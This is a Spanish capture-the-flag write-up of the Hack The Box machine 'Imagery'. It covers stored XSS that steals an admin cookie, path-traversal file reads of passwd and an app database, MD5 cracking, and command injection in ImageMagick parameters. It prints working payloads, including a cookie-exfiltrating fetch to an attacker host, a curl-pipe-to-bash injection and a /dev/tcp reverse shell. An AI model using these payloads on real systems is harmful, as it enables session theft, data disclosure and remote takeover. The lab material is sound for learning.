---
title: "Imagery"
date: 2025-02-03 12:00:00 +0100
categories: [writeups]
tags: [HTB, XSS, LFI, Hash, Privesc, Medium, Linux]
image:
  path: /assets/img/imagery.png
  alt: "Miniatura del post"
  w: 1200     # Ancho real de la imagen en px (recomendado)
  h: 630      # Alto real (ratio típico 1.91:1) — recomendado por Chirpy
---

# Imagery
En esta máquina trataremos principalmente los siguientes puntos. 

| Contenido |
|-----------|
|-XSS Injection via Report Bug |
|-Stealing administrator user session cookie via XSS |
|-LFI to obtain users Hashes |
|-Cracking Hashes |
|-Command Injection in ImageMagick (convert) to Gain System Access |
|-System Files Enumeration |
|-Cracking AES zip (pyAesCrypt) |
|-Abussing sudoers privilege via Charcol backup software (Privilege Escalation) |

Como siempre, lo primero que solemos hacer por cuestión de buenas prácticas, es crearnos nuestros directorios de trabajo que nos permitirán trabajar de forma organizada. Una vez estamos listos y tenemos conectividad con la máquina comenzamos enumerando el objetivo. Nos interesa en primer lugar ver qué puertos tiene abiertos. 

```bash
sudo nmap -p- --open -sS -vvv -n -Pn [IPObjetivo] -oG allPorts
sudo nmap -sC -sV -p[Puertos] [IPObjetivo] -oN targeted
```

![Captura de pantalla 1](/assets/img/imagery/5.jpg)

Ahora tenemos algo más de información. En cuanto a la versión de SSH, no parece vulnerable, por lo que tendremos que centrar nuestra atención en el puerto 8000. De hecho esto de "Werkzeug httpd 3.1.3 (Python 3.12.7)" es un servidor web ligero de desarrollo que forma parte de Werkzeug, una biblioteca base de Python que se usa mucho con Flask, un framework web minimalista. Normalmente este servidor, es para desarrollo y no debería emplearse nunca para producción, ya que no cuenta con medidas de seguridad ni rendimiento como Nginx por ejemplo. Dicho de otra forma, esto seguramente presente muchas vulnerabilidades.

Lo primero que vamos a hacer, es lanzar whatweb para ver las tecnologías que corren por detrás.

```bash
whatweb http://[IPObjetivo]:8000]
```
![Captura de pantalla 2](/assets/img/imagery/6.jpg)

Vemos un correo de contacto, información del servidor, la tecnologías empleadas, etc. Podemos ir haciéndonos ya una idea de lo que nos vamos a enfrentar. Ahora ya sí, vamos a echarle un vistazo al sitio web

```
http://[IPObjetivo]:8000
```
La web presenta varias secciones. Un portal de inicio, una sección de Login y una sección para crear una cuenta. Vamos a empezar creando una cuenta. 
Al acceder con nuestra cuenta, podemos subir una imagen. Pues vamos a hacerlo.

![Captura de pantalla 3](/assets/img/imagery/8.jpg)

En este punto, podemos y debemos ir ya probando cositas. Vemos también que con esta cuenta creada, hay algunas funcionalidades que están bloqueadas o no permitidas. Para ir al grano, en la parte inferior vemos una sección llamada "Report Bug"

![Captura de pantalla 4](/assets/img/imagery/10.jpg)

Si hay una sección para enviar Bug, quiero pensar que debe haber una cuenta de administrador que gestione esto por detrás, ya sea para revisarlo o confirmarlos. Puede estar interesante probar en este caso una inyección XSS. De hecho, al enviar algo, nos avisan de que el Admin lo va a revisar. Pues lo dicho, podemos tratar de probar un XSS, de manera que si se ejecuta nuestro JavaScript en el reporte de Bugs, es posible que obtengamos la cookie de sesión del administrador cuando abra el informe. Antes de esto, vamos a hacer una primera prueba para ver si al abrir el informe de Bugs el Admin, nos hace una petición a nuestro servidor local de Python. De hecho, algo que podemos comprobar para ver si puede o no ser vulnerable, es echarle un vistazo a HttpOnly. Si está en False, es un indicativo de qué podría llegar a ser vulnerable

![Captura de pantalla 5](/assets/img/imagery/11.jpg)
![Captura de pantalla 6](/assets/img/imagery/12.jpg)


Lo primero que vamos a hacer, es montarnos un servidor web con Python

```bash
python3 -m http.server 80
```
Ahora, vamos a enviar esta carga en el reporte de Bugs para ver si el Admin pincha y nos manda una petición

```
<script><img src="http://IPAtacante/XSS"></script>
```
Si revisamos nuestro servidor de Python, veremos que la IP 10.10.11.88, es decir, la máquina objetivo, ha intentado llegar a nuestro servidor y por lo tanto esto significa que es vulnerable a inyecciones XSS Stored.
![Captura de pantalla 7](/assets/img/imagery/13.jpg)
![Captura de pantalla 8](/assets/img/imagery/14.jpg)

Pues sabiendo que es vulnerable a Stored XSS, ahora podemos tratar de robar la cookie de sesión del Admin como anticipábamos,  de la siguiente manera

```
<img src=x onerror="fetch('http://IPAtacante/?cookie='+encodeURIComponent(document.cookie))">
```
![Captura de pantalla 9](/assets/img/imagery/15.jpg)

Si volvemos a nuestro servidor web de Python, y esperamos un poquito. Cuando el Administrador abra el informe de Bugs que le hemos enviado, lograremos robar su cookie de sesión y ahora podemos suplantar su identidad y ganar acceso a su panel

![Captura de pantalla 10](/assets/img/imagery/16.jpg)

Tenemos la cookie de Admin, por lo que si ahora vamos al propio navegador y cambiamos nuestra cookie por esta, deberíamos ganar acceso al panel del Admin recargando la página.

![Captura de pantalla 11](/assets/img/imagery/17.jpg)
![Captura de pantalla 12](/assets/img/imagery/18.jpg)

Revisando un poco las nuevas funcionalidades que nos da este panel, en la sección User Management, podemos descargar logs de un usuario dado. Si pinchamos sobre Download Log nos saldrá el siguiente mensaje

![Captura de pantalla 13](/assets/img/imagery/19.jpg)

Nos dice que no nos puede mostrar o descargar el archivo de logs porque no se encuentra en el servidor. Si este endpoint está apuntando o apunta directamente a archivos del servidor, debemos pensar entonces en un posible LFI. Vamos a interceptar esto con Burpsuite y vamos a probar cositas.

Vamos a enviar la petición al Repeter y vamos a tratar de apuntar a un archivo local de la máquina

```
GET /admin/get_system_log?log_identifier=../../../../../../etc/passwd HTTP/1.1
```
![Captura de pantalla 14](/assets/img/imagery/22.jpg)

Efectivamente es vulnerable a LFI. Vamos a ver qué podemos enumerar y como podemos ganar acceso al sistema. Vemos que hay 3 usuarios: el usuario root, un usuario web y mark.


Algo que podemos enumerar es el archivo /proc/self/environ. Es un archivo virtual de Linux que contiene las variables de entorno del proceso actual. Es decir, son las variables de entorno del proceso que está ejecutando la aplicación web.

```
GET /admin/get_system_log?log_identifier=../../../../../../proc/self/environ HTTP/1.11
```
![Captura de pantalla 15](/assets/img/imagery/23.jpg)

Como vemos, nos da información importante para continuar con nuestra enumeración. El usuario que está corriendo el servicio es el usuario web desde un entorno virtual de Python /home/web/web/env/bin. Lo que vamos a hacer, es tratar de enumerar archivos existentes en esta ruta donde se lanza el aplicativo. Vamos a crearnos un pequeño diccionario con nombres de archivos comunes en aplicaciones web tipo Flask

```bash
nano files.txt
```
```
config.php
config.py
settings.py
app.py
run.py
wsgi.py
.env
README.md
index.html
.flaskenv
```
También vamos a montarnos un script en bash rápidamente, que va a ir Fuzzeando en el directorio /home/web/web, para comprobar si existe alguno de estos archivos.

```bash
touch fuzzing.sh
chmod +x fuzzing.sh
```
```bash
#!/bin/bash
COOKIE="session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aVBKBQ.1uIYmTnZdtPmeVQIj_tHRFwUVLk"

for file in $(cat files.txt); do
    RESPONSE=$(curl -s -b "$COOKIE" "http://10.10.11.88:8000/admin/get_system_log?log_identifier=../../../../../../home/web/web/$file")

    if [[ ! $RESPONSE =~ "Error reading file" ]]; then
        echo "[+] Found: $file"
    fi
done
```
Ahora simplemente lo ejecutamos 

```bash
./fuzzing.sh
```
![Captura de pantalla 16](/assets/img/imagery/24.jpg)

Nuestro script nos reporta que existen los archivos config.py y app.py. Vamos a echarles un vistazo

```
GET /admin/get_system_log?log_identifier=../../../../../../home/web/web/config.py HTTP/1.11
```
![Captura de pantalla 15](/assets/img/imagery/25.jpg)

Vemos que en el archivo config.py, se hace referencia a un archivo db.json en el que se guardan datos. Vamos a echarle un vistazo

```
GET /admin/get_system_log?log_identifier=../../../../../../home/web/web/db.json HTTP/1.11
```
![Captura de pantalla 16](/assets/img/imagery/26.jpg)

Pues tenemos las contraseñas en formato MD5 seguramente para los usuarios admin y testuser.
```
"username": "admin@imagery.htb",
"password": "5d9c1d507a3f76af1e5c97a3ad1eaa31"
"username": "testuser@imagery.htb",
"password": "2c65c8d7bfbca32a3ed42596192384f6"
```
Lo primero que vamos a hacer, es comprobar que el hash, efectivamente es un MD5. Para ello, podemos utilizar hash-identifier

Sabiendo que ambos son MD5, podemos tirar de hashcat, john o CrackStation para romperlos fácilmente.

```bash
echo -e "5d9c1d507a3f76af1e5c97a3ad1eaa31\n2c65c8d7bfbca32a3ed42596192384f6" > hashes.txt
```
```bash
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 0 --show hashes.txt
```
![Captura de pantalla 17](/assets/img/imagery/30.jpg)

Si queremos hacerlo con john podemos utilizar este comando. Igualmente solo nos pillará la contraseña para el usuario testuser.

```bash
john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --show --format=Raw-MD5 hashes.txt
```
Por último podemos hacerlo con CrackStation si queremos

```
https://crackstation.net/
```
Al iniciar sesión con esta cuenta de usuario, en principio no parece que veamos nada nuevo o interesante. Es prácticamente las mismas funcionalidades que veíamos cuando creamos una cuenta nosotros mismos. Salvo por una peculiaridad. Ahora si probamos a subir una imagen, podemos editarla. Si por ejemplo de la damos a Transform Image, podemos editar la imagen en muchos aspectos. Si este aplicativo corre a nivel de sistema, puede ser que alguno de estos parámetros sea vulnerable a inyección de comandos. En este punto vamos a necesitar de Burpsuite para capturar esta petición y ver si podemos inyectar comandos. Dado que tenemos también LFI, podríamos tratar de buscar información sobre como se procesa este software de edición o lo que sea.

Tratando de buscar pistas sobre algún aplicativo que pueda estar realizando estas acciones, descubrimos que se está empleando la herramienta convert desde la ruta /usr/bin/convert

![Captura de pantalla 18](/assets/img/imagery/38.jpg)

Vamos a editar el tamaño de la imagen y capturar la petición con Burpsuite para tratar de inyectar comandos en alguno de los siguientes campos. Enviamos la petición al Repeter y vamos a ir probando. Si probamos a meterle una comilla al parámetro "x" vamos a ver lo siguiente 

```
"x":"'id",
```
![Captura de pantalla 19](/assets/img/imagery/35.jpg)

Al meterle una comilla, el servidor responde con un error. Esto indica que la entrada se está ejecutando en un interprete de comandos /bin/sh. Con esto, podemos concatenarle un comando empleando ; o && de la siguiente manera. Al probar con ; y && vemos que se sigue aconteciendo el mismo error. Esto es debido a que rompen la sintaxis. Para solucionar esto, podemos utilizar lo que se conoce como "Command Substitution". Podemos utilizar alguno de los siguientes

```
`comando`
$(comando)
```
```
"x":"1 $(id)",
```
![Captura de pantalla 20](/assets/img/imagery/36.jpg)

Como vemos, se ha ejecutado nuestro comando id. De una forma un tanto fea, pero tenemos RCE. Ahora lo suyo, es obviamente ganar acceso al sistema. Para ello, podemos hacer como lo hacemos siempre. Vamos a crearnos un archivo index.html con el siguiente contenido

```
#!/bin/bash

bash -c 'bash -i >& /dev/tcp/IPAtacante/443 0>&1'
```
Ahora nos montamos un servidor web con Python por el puerto 80 y nos ponemos en escucha por netcat para recibir la Shell 

```bash
nc -nlvp 443
```
Por último, en Burpsuite, vamos a lanzar un comando que lea nuestro index.html y lo pipeamos con Bash para que se ejecute.

```
"x":"1 $(curl http://IPAtacante/index.html|bash)",
```
![Captura de pantalla 21](/assets/img/imagery/37.jpg)

Por arriba se tramita la petición por curl a nuestro archivo malicioso de Reverse Shell, y por abajo ganamos acceso al sistema

Como siempre, hacemos un pequeño tratamiento de la TTY para operar desde una consola totalmente interactiva

```bash
script /dev/null -c bash
CTRL + Z
stty raw -echo; fg
reset xterm
```
Con esto podemos hacer CTRL + C sin perder la Shell. Para limpiar la pantalla con CTRL + L ejecutamos la siguiente instrucción 

```bash
echo $TERM
export TERM=xterm
```
Por último, ajustamos las proporciones a nuestro equipo 

```bash
stty size
stty rows 44 columns 183
```


